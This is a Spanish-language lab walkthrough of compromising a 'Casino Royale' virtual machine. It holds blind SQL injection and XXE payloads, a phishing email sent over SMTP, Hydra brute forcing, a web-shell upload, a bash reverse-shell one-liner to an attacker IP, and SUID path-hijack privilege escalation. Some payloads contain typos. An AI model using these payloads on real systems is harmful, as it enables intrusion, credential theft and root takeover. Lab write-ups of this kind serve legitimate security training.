___
- tags: #machine #linux #sqli #xxe #hydra #pivoting #abusing_privilege #suid 
___
## Enumeración
### nmap
```shell
# Extrae la info de todos los puertos abiertos
nmap -p- --open -sS -Pn -n -vvv --min-rate 5000 <ip> -oG all-ports

# Prueba los scripts más comunes para los puertos encontrados
nmap -p<puertos,1,2...> -sCV <ip> -oN targeted

# Extrae posibles rutas 
nmap --script http-enum -p80,8081 192.168.1.17 -oN webScan

# Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-30 16:52 -03
# Nmap scan report for 192.168.1.17
# Host is up (0.00027s latency).
# 
# PORT     STATE SERVICE
# 80/tcp   open  http
# | http-enum: 
# |   /robots.txt: Robots file
# |   /phpmyadmin/: phpMyAdmin
# |   /cards/: Potentially interesting folder
# |   /includes/: Potentially interesting folder
# |_  /install/: Potentially interesting folder
# 8081/tcp open  blackice-icecap
# MAC Address: 00:0C:29:5F:E2:3F (VMware)
```

### whatweb
```shell
# Extrae la información web
whatweb http://<ip>
# ->http://192.168.1.17 [200 OK] Apache[2.4.25], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.25 (Debian)], IP[192.168.1.17], Script
```

## Descubrimiento
### Acerca del sistema
- Apache httpd 2.4.25 + launchpad -> Es un Debian Stretch
### Endpoints
- ruta principal: http://192.168.1.17/
	- http://192.168.1.17/pokeradmin/
	- http://192.168.1.17/pokeradmin/configure.php -> 
		- requiere javascript:document.cookie = "ValidUserAdmin=admin";
		- Vulnerable a inyección SQL -> ' or 1=1 --
	- http://casino-royale.local/vip-client-portfolios/
	- http://casino-royale.local/ultra-access-view/main.php
## Explotación
### SQLi
Tiene vulnerabilidades de inyección SQL del tipo booleanas
#### Largo del nombre de la base de datos
```sql
if(database()>=7,sleep(5),1) -- -
```
#### Enumeración de bases de datos
```sql
if(substr(database(),1,1)='a,sleep(5),1) -- -
```

#### Enumeración de todas las bases de datos disponibles
```sql
and if(substr((selct group_concat(schema_name) from information_schema.schemata),%d,1)='%s',sleep(0.85),1)
```

```txt
# bases de datos encontradas
information_schema,mysql,performance_schema,phpmyadmin,pokerleague,vip
```
#### Enumeración de todas las tablas de una base de datos
```sql
and if(substr((selct group_concat(table_name) from information_schema.tables where table_schema='pokerleague'),%d,1)='%s',sleep(0.85),1)
```

```txt
# Tablas de la base 'pokerleague' de datos encontradas
pokermax_admin,pokermax_players,pokermax_scores,pokermax_tournaments
```

#### Enumeración de todos los atributos

```sql
and if(substr((selct group_concat(column_name) from information_schema.columns where table_schema='pokerleague' and table_name='pokermax_admin'),%d,1)='%s',sleep(0.85),1)
```

```txt
# Atributos encontrados
id,username,password,league_name,league_information,league_email,league_tournament_director
```

### SMTP
Explotamos un ataque CSRF por Snowfox
```shell
# nos conectamos
telnet 192.168.1.84 25

# le indicamos desde quien se envia el correo
MAIL FROM: chicoj2ck

# Le indicamos quien lo recive
RCPT TO: valenka

# escribimos el cuerpo
data

# continuamos
subject: obanno

Mira este link:
http://192.168.1.84/pwned.html
.
```

### XML Injection
Injectamos una entidad XML y descubrimos que en el archivo **/etc/passwd** nos arroja un usuario llamativo: **ftpUserULTRA**.

```xml
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
	<creds>
		<customer>&xxe;</customer>
		<password>chicoj2ck123</password>
	</creds>
```

### Directory Listing
Tenemos capacidad de listar directorios en la ruta: "http://casino-royale.local/ultra-access-view/"

### Hydra al FTP
Intentamos realizar fuerza bruta sobre el usuario **ftpUserULTRA**.
```shell
hydra -l ftpUserULTRA -P /usr/share/wordlists/rockyou.txt -t 20

# Respuesta
#[21][ftp] host: 192.168.1.17   login: ftpUserULTRA   password: bankbank
```

#### FTP
```shell
# lista todo
ls -la

# sube un archivo
put cmd.php3

# renombra un archivo
rename

# Da todos los permisos
chmod 777 cmd.php3
```

### RCE
```txt
## One Liner URL encoded
bash -c "bash -i >& /dev/tcp/192.168.1.84/443 0>&1 "

## One Liner URL encoded
bash -c "bash -i >%26 /dev/tcp/192.168.1.84/443 0>%261 "
```

#### Tratamiento de la tty
```shell
script /dev/null -c bash
^Z # ctrl + z
stty raw -echo; fg
reset xterm

# exportamos variables de entorno
export TERM=xterm
export SHELL=bash

# ajustamos filas y columnas de la terminal
stty rows 38 columns 183
```

## Escalar privilegios
### find
```shell
find / -name \*config\* 2>/dev/null -exec cat {} \; | less -S -r
```

### Pivoting
```shell
# listamos los usuarios
ls -l /home/

# cambiamos de usuario
su valenka
```

### Revisamos como seguir escalando
```shell
# nos movemos a la raiz de valenka
cd /

# revisamos el historial en bash
cat .bash_history

# lista servicios
	# con crontab
crontab -l

	# con systemctl
systemctl list-timers
```

### Buscamos Archivos con permisos SUID
```shell
find / -perm -4000 2>/dev/null

# encuentra /opt/casino-royale/mi6_detect_test
```

#### Buscamos dentro del binario
```shell
strings /opt/casino-royale/mi6_detect_test
# encontramos /bin/bash run.sh
```

Como ejecuta `run.sh` directamente, sin ruta absoluta, nos aprovechamos para crear un archivo `run.sh` y que nos ejecute una bash (como tiene permisos de super usuario, nos debiera lanzar una bash como root).
##### run.sh
```txt
#!/bin/bash

bash -p
```


#### Buscamos la flag
Encontramos la flag como un ejecutable, por lo que hay que servirla en la web
```shell
php -S 0.0.0.0:8084
```

## Apuntes
### chmod
```shell
chmod 777 cmd.php3
```
- **`4`:** Permiso de lectura (ver el contenido).
- **`2`:** Permiso de escritura (modificar el archivo).
- **`1`:** Permiso de ejecución (ejecutar el archivo).
### find
`-exec cat {} \;`  
Por cada archivo encontrado, ejecuta el comando `cat <archivo>` para mostrar su contenido.
- `{}`: Es un placeholder que `find` reemplaza por el nombre del archivo encontrado.
- `\;` : Indica el fin del comando `-exec` (el `\` evita que el shell interprete el `;`).
### less
- `-s`: colapsa las lineas en blanco consecutivas en una sola línea en blanco.
- `-r`: muestra todo en modo raw
___
## Referencia
- [searchdb - exploit pokermax](https://www.exploit-db.com/exploits/6766).